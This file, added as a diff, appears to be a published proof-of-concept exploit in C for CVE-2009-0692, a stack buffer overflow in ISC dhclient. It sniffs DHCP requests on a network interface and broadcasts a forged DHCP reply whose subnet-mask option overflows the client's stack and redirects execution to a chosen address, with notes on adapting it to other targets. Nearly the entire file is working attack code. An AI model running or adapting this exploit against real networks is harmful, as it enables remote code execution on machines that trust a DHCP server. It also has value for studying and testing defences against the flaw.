@@ -1,0 +1,306 @@
+/*
+ * cve-2009-0692.c
+ *
+ * ISC DHCP dhclient < 3.1.2p1 Remote Exploit
+ * Jon Oberheide <jon@oberheide.org>
+ * http://jon.oberheide.org
+ * 
+ * Information:
+ * 
+ *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0692
+ * 
+ *   Stack-based buffer overflow in the script_write_params method in 
+ *   client/dhclient.c in ISC DHCP dhclient 4.1 before 4.1.0p1, 4.0 before 
+ *   4.0.1p1, 3.1 before 3.1.2p1, 3.0, and 2.0 allows remote DHCP servers to 
+ *   execute arbitrary code via a crafted subnet-mask option.
+ * 
+ * Usage:
+ *
+ *   $ gcc cve-2009-0692.c -o cve-2009-0692 -lpcap -ldnet
+ *   $ sudo ./cve-2009-0692
+ *   [+] listening on eth0: ip and udp and src port 68 and dst port 67
+ *   [+] snarfed DHCP request from 00:19:d1:90:e5:4a with xid 0x120f8920
+ *   [+] sending malicious DHCP response to 00:19:d1:90:e5:4a with xid 0x120f8920
+ *
+ *   $ gdb /sbin/dhclient
+ *   ...
+ *   DHCPREQUEST on eth0 to 255.255.255.255 port 67
+ *   DHCPACK from 0.6.9.2
+ *   ...
+ *   Program received signal SIGSEGV, Segmentation fault.
+ *   0x41414141 in ?? ()
+ * 
+ * Notes:
+ * 
+ *   Only tested with dhclient 3.1.2 on 32-bit Gentoo / GCC 4.3.3.  Feel free
+ *   to tweak for your target platform.  Depends on libdnet and libpcap.
+ *
+ *   READABLE_1 and READABLE_2 need to be readable addresses as we fix up the 
+ *   stack during our overflow.  After a successful return from the vulnerable
+ *   script_write_params function, EIP will be set to JMP_TARGET.
+ *
+ *   Exclusively for use at DEFCON next week.  ;-) 
+ */
+
+#include <ctype.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include <unistd.h>
+#include <dnet.h>
+#include <pcap.h>
+
+#define READABLE_1         "\xa8\xfc\x0b\x08" /* for es.client */
+#define READABLE_2         "\xbc\x34\x0a\x08" /* for es.prefix */
+#define JMP_TARGET         "\x41\x41\x41\x41"
+
+#define BPF_FILTER         "ip and udp and src port 68 and dst port 67"
+#define PKT_BUFSIZ         1514
+#define DHCP_OP_REQUEST    1
+#define DHCP_OP_REPLY      2
+#define DHCP_TYPE_REQUEST  3
+#define DHCP_TYPE_ACK      5
+#define DHCP_OPT_REQIP     50
+#define DHCP_OPT_MSGTYPE   53
+#define DHCP_OPT_END       255
+#define DHCP_CHADDR_LEN    16
+#define SERVERNAME_LEN     64
+#define BOOTFILE_LEN       128
+#define DHCP_HDR_LEN       240
+#define DHCP_OPT_HDR_LEN   2
+
+#ifndef __GNUC__
+# define __attribute__(x)
+# pragma pack(1)
+#endif
+
+struct dhcp_hdr {
+	uint8_t op;
+	uint8_t hwtype;
+	uint8_t hwlen;
+	uint8_t hwopcount;
+	uint32_t xid;
+	uint16_t secs;
+	uint16_t flags;
+	uint32_t ciaddr;
+	uint32_t yiaddr;
+	uint32_t siaddr;
+	uint32_t giaddr;
+	uint8_t chaddr[DHCP_CHADDR_LEN];
+	uint8_t servername[SERVERNAME_LEN];
+	uint8_t bootfile[BOOTFILE_LEN];
+	uint32_t cookie;
+} __attribute__((__packed__));
+
+struct dhcp_opt {
+	uint8_t opt;
+	uint8_t len;
+} __attribute__((__packed__));
+
+#ifndef __GNUC__
+# pragma pack()
+#endif
+
+void
+process(u_char *data, const struct pcap_pkthdr *pkthdr, const u_char *pkt)
+{
+	eth_t *raw;
+	struct ip_hdr *ip_h;
+	struct eth_hdr *eth_h;
+	struct udp_hdr *udp_h;
+	struct dhcp_hdr *dhcp_h;
+	struct dhcp_opt *dhcp_opt;
+	char *dev = data, *ptr;
+	char pktbuf[PKT_BUFSIZ], options[PKT_BUFSIZ], payload[PKT_BUFSIZ];
+	int opt_len, clen = pkthdr->caplen;
+	uint8_t msg_type = 0, payload_len = 0;
+	uint32_t yiaddr = 0;
+
+	/* packet too short */
+	if (clen < ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + DHCP_HDR_LEN + DHCP_OPT_HDR_LEN) {
+		return;
+	}
+
+	eth_h = (struct eth_hdr *) pkt;
+	ip_h = (struct ip_hdr *) ((char *) eth_h + ETH_HDR_LEN);
+	udp_h = (struct udp_hdr *) ((char *) ip_h + IP_HDR_LEN);
+	dhcp_h = (struct dhcp_hdr *) ((char *) udp_h + UDP_HDR_LEN);
+	dhcp_opt = (struct dhcp_opt *) ((char *) dhcp_h + DHCP_HDR_LEN);
+
+	/* only care about REQUEST opcodes */
+	if (dhcp_h->op != DHCP_OP_REQUEST) {
+		return;
+	}
+
+	/* parse DHCP options */
+	while (1) {
+		if (dhcp_opt->opt == DHCP_OPT_MSGTYPE) {
+			if (dhcp_opt->len != 1) {
+				return;
+			}
+			memcpy(&msg_type, (char *) dhcp_opt + DHCP_OPT_HDR_LEN, dhcp_opt->len);
+		}
+		if (dhcp_opt->opt == DHCP_OPT_REQIP) {
+			if (dhcp_opt->len != 4) {
+				return;
+			}
+			memcpy(&yiaddr, (char *) dhcp_opt + DHCP_OPT_HDR_LEN, dhcp_opt->len);
+		}
+		if (dhcp_opt->opt == DHCP_OPT_END) {
+			break;
+		}
+		if (((char *) dhcp_opt - (char *) pkt) + DHCP_OPT_HDR_LEN + dhcp_opt->len > clen) {
+			break;
+		}
+		dhcp_opt = (struct dhcp_opt *) ((char *) dhcp_opt + DHCP_OPT_HDR_LEN + dhcp_opt->len);
+	}
+
+	/* only care about REQUEST msg types */
+	if (msg_type != DHCP_TYPE_REQUEST) {
+		return;
+	}
+
+	printf("[+] snarfed DHCP request from %s with xid 0x%08x\n", eth_ntoa(&eth_h->eth_src), dhcp_h->xid);
+	printf("[+] sending malicious DHCP response to %s with xid 0x%08x\n\n", eth_ntoa(&eth_h->eth_src), dhcp_h->xid);
+
+	/* construct stack payload */
+	memset(payload, 0, sizeof(payload));
+	ptr = payload;
+	memset(ptr, 0, 16);
+	ptr += 16;
+	memcpy(ptr, READABLE_1, 4);
+	ptr += 4;
+	memcpy(ptr, READABLE_2, 4);
+	ptr += 4;
+	memset(ptr, 0, 8);
+	ptr += 8;
+	memcpy(ptr, "\x04\x00\x00\x00", 4);
+	ptr += 4;
+	memset(ptr, 0, 28);
+	ptr += 28;
+	memcpy(ptr, JMP_TARGET, 4);
+	ptr += 4;
+	payload_len = ptr - payload;
+
+	/* dhcp header */
+	dhcp_h->op = DHCP_OP_REPLY;
+	memcpy(&dhcp_h->yiaddr, &yiaddr, 4);
+
+	/* normal dhcp options */
+	memset(options, 0, sizeof(options));
+	ptr = options;
+	memcpy(ptr, "\x35\x01\x05", 3);
+	ptr += 3;
+	memcpy(ptr, "\x36\x04\x00\x06\x09\x02", 6);
+	ptr += 6;
+	memcpy(ptr, "\x33\x04\x00\x09\x3a\x80", 6);
+	ptr += 6;
+	memcpy(ptr, "\x03\x04\x00\x06\x09\x02", 6);
+	ptr += 6;
+	memcpy(ptr, "\x06\x04\x00\x06\x09\x02", 6);
+	ptr += 6;
+
+	/* malicious subnet mask option */
+	memcpy(ptr, "\x01", 1);
+	ptr += 1;
+	memcpy(ptr, &payload_len, 1);
+	ptr += 1;
+	memcpy(ptr, payload, payload_len);
+	ptr += payload_len;
+
+	memcpy(ptr, "\xff", 1);
+	ptr += 1;
+	opt_len = ptr - options;
+
+	/* construct full packet payload */
+	memset(pktbuf, 0, sizeof(pktbuf));
+	ptr = pktbuf;
+
+	eth_pack_hdr(ptr, ETH_ADDR_BROADCAST, "\xc1\x1e\x20\x09\x06\x92", ETH_TYPE_IP);
+	ptr += ETH_HDR_LEN;
+
+	ip_pack_hdr(ptr, 0, IP_HDR_LEN + UDP_HDR_LEN + DHCP_HDR_LEN + opt_len, 0x0692, IP_DF, 64, IP_PROTO_UDP, 34145792, IP_ADDR_BROADCAST);
+	ptr += IP_HDR_LEN;
+
+	udp_pack_hdr(ptr, 67, 68, UDP_HDR_LEN + DHCP_HDR_LEN + opt_len);
+	ptr += UDP_HDR_LEN;
+
+	memcpy(ptr, dhcp_h, DHCP_HDR_LEN);
+	ptr += DHCP_HDR_LEN;
+
+	memcpy(ptr, options, opt_len);
+	ptr += opt_len;
+
+	ip_checksum(pktbuf + ETH_HDR_LEN, IP_HDR_LEN + UDP_HDR_LEN + DHCP_HDR_LEN + opt_len);
+
+	/* fire off malicious response */
+	raw = eth_open(dev);
+	if (!raw) {
+		fprintf(stderr, "[-] error opening raw socket on %s\n", dev);
+		exit(1);
+	}
+	eth_send(raw, pktbuf, ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + DHCP_HDR_LEN + opt_len);
+	eth_close(raw);
+}
+
+void
+usage(char **argv)
+{
+	fprintf(stderr, "usage: %s [-i interface]\n", argv[0]);
+	exit(1);
+}
+
+int
+main(int argc, char **argv)
+{
+	int ch, ret;
+	char *dev = NULL;
+	char errbuf[PCAP_ERRBUF_SIZE];
+	struct bpf_program bfp;
+	pcap_t *ph;
+	
+	opterr = 0;
+
+	while ((ch = getopt(argc, argv, "i:")) != -1) {
+		switch (ch) {
+		case 'i':
+			dev = optarg;
+			break;
+		default:
+			usage(argv);
+		}
+	}
+
+	if (!dev) {
+		dev = pcap_lookupdev(errbuf);
+		if (!dev) {
+			fprintf(stderr, "[-] couldn't find default interface: %s\n", errbuf);
+			exit(1);
+		}
+	}
+
+	ph = pcap_open_live(dev, PKT_BUFSIZ, 1, 1, errbuf);
+	if (!ph) {
+		fprintf(stderr, "[-] couldn't open interface %s: %s\n", dev, errbuf);
+		exit(1);
+	}
+
+	ret = pcap_compile(ph, &bfp, BPF_FILTER, 1, 0);
+	if (ret == -1) {
+		fprintf(stderr, "[-] couldn't parse BPF filter: %s\n", pcap_geterr(ph));
+		exit(1);
+	}
+
+	pcap_setfilter(ph, &bfp);
+	if (ret == -1) {
+		fprintf(stderr, "[-] couldn't set BPF filter: %s\n", pcap_geterr(ph));
+		exit(1);
+	}
+
+	printf("[+] listening on %s: %s\n", dev, BPF_FILTER);
+
+	pcap_loop(ph, -1, process, dev);
+
+	return 0;
+}
